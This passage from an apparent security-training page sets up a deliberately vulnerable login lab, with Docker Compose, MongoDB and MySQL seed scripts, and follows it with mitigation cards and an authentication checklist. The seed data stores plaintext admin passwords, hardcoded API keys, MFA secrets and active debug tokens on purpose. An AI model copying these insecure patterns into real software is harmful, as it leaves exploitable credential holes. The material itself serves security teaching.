    command: mitmweb --web-host 0.0.0.0 --listen-port 8080 --web-port 8081
    networks:
      - lab-net

volumes:
  mongo-data:
  mysql-data:

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```javascript [init-mongo.js]
// MongoDB initialization for auth bypass lab

db = db.getSiblingDB('auth_lab');

// Users collection
db.users.insertMany([
  {
    username: "admin",
    email: "admin@target.com",
    password: "$2b$10$hashedpassword1",
    role: "admin",
    mfa_enabled: true,
    mfa_secret: "JBSWY3DPEHPK3PXP",
    api_key: "sk_admin_supersecret_key"
  },
  {
    username: "john",
    email: "john@example.com",
    password: "$2b$10$hashedpassword2",
    role: "user",
    mfa_enabled: false,
    api_key: "sk_user_john_key_456"
  },
  {
    username: "jane",
    email: "jane@example.com",
    password: "$2b$10$hashedpassword3",
    role: "user",
    mfa_enabled: true,
    mfa_secret: "NBSWY3DPEHPK3PXQ",
    api_key: "sk_user_jane_key_789"
  },
  {
    username: "manager",
    email: "manager@target.com",
    password: "$2b$10$hashedpassword4",
    role: "manager",
    mfa_enabled: false,
    api_key: "sk_manager_key_012"
  }
]);

// Sessions collection
db.sessions.createIndex({ "expires": 1 }, { expireAfterSeconds: 0 });

// API tokens collection
db.api_tokens.insertMany([
  { token: "internal_api_token_xyz", scope: "admin", active: true },
  { token: "debug_token_123", scope: "debug", active: true },
]);

// Audit log
db.audit_log.createIndex({ "timestamp": 1 });

print("[*] Auth bypass lab database initialized");
```

::

::code-collapse

```sql [init-mysql.sql]
-- SQL Injection Login Lab Database

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(255),
    role VARCHAR(20) DEFAULT 'user',
    is_active BOOLEAN DEFAULT TRUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS sessions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    session_token VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

CREATE TABLE IF NOT EXISTS secrets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    key_name VARCHAR(100),
    key_value TEXT,
    description TEXT
);

-- Insert users (passwords are plaintext for lab — intentionally vulnerable)
INSERT INTO users (username, password, email, role) VALUES
('admin', 'SuperSecretAdmin123!', 'admin@target.com', 'admin'),
('john', 'john_password_456', 'john@example.com', 'user'),
('jane', 'jane_password_789', 'jane@example.com', 'user'),
('api_user', 'api_service_key', 'api@internal.com', 'service'),
('backup', 'backup_admin_key', 'backup@target.com', 'admin');

-- Insert secrets
INSERT INTO secrets (key_name, key_value, description) VALUES
('db_master_key', 'master_encryption_key_xxxxx', 'Database master encryption key'),
('api_signing_key', 'hmac_signing_secret_yyyyy', 'API request signing key'),
('aws_access_key', 'AKIAIOSFODNN7EXAMPLE', 'AWS access key for S3'),
('aws_secret_key', 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY', 'AWS secret key'),
('stripe_key', 'sk_live_stripe_key_zzzzz', 'Stripe payment processing key');
```

::

---

## Mitigation & Prevention

::card-group
  ::card
  ---
  title: Parameterized Queries
  icon: i-lucide-database
  ---
  **Always** use parameterized queries or prepared statements. Never concatenate user input into SQL, LDAP, or NoSQL queries.
  ::

  ::card
  ---
  title: Strong Password Policy
  icon: i-lucide-key-round
  ---
  Enforce minimum length (12+), complexity requirements, and check against breach databases. Change all default credentials before deployment.
  ::

  ::card
  ---
  title: JWT Best Practices
  icon: i-lucide-shield-check
  ---
  Whitelist allowed algorithms (never accept `none`). Use strong secrets (256+ bits). Validate all claims — `exp`, `iss`, `aud`. Never trust embedded keys (`jwk`, `jku`) without validation.
  ::

  ::card
  ---
  title: Server-Side Auth State
  icon: i-lucide-server
  ---
  **Never** rely on client-side response data for authentication state. All authorization decisions must be made server-side. Session validity must be checked on every request.
  ::

  ::card
  ---
  title: Robust MFA
  icon: i-lucide-smartphone
  ---
  Rate limit OTP attempts aggressively (3-5 attempts). Invalidate OTPs after single use. Enforce MFA server-side — never allow client-side skip. Use TOTP over SMS where possible.
  ::

  ::card
  ---
  title: Account Lockout & Monitoring
  icon: i-lucide-lock
  ---
  Lock accounts after 5-10 failed attempts. Implement progressive delays. Log all authentication events. Alert on anomalous patterns — credential stuffing, distributed brute-force.
  ::
::

### Secure Authentication Checklist

::field-group
  ::field{name="Input Validation" type="critical"}
  All login inputs are sanitized. Parameterized queries used for all database interactions. No string concatenation in auth queries.
  ::

  ::field{name="Session Management" type="critical"}
  Sessions regenerated after authentication. Secure cookie flags set (`HttpOnly`, `Secure`, `SameSite`). Absolute session timeouts enforced.
  ::

  ::field{name="Token Security" type="critical"}
  JWT algorithms whitelisted. Strong signing secrets. Token expiration enforced server-side. Refresh token rotation implemented.
  ::

  ::field{name="MFA Enforcement" type="high"}
  MFA verified server-side. OTP rate limited and single-use. No step-skipping possible. Backup codes hashed and limited.
  ::

  ::field{name="Default Credentials" type="high"}
  All default passwords changed. Setup wizards force password change. No hardcoded credentials in source code.
  ::

  ::field{name="Access Control" type="critical"}
  All protected endpoints verify authentication server-side. Middleware applies consistently. No path-based bypass possible.
  ::

  ::field{name="Logging & Monitoring" type="high"}
  All login attempts logged. Failed attempt alerts configured. Brute-force detection active. Geographic anomaly detection enabled.
  ::

  ::field{name="OAuth / SSO" type="high"}
  `redirect_uri` strictly validated. State parameter enforced and verified. Client secrets stored securely. Authorization codes single-use.
  ::
::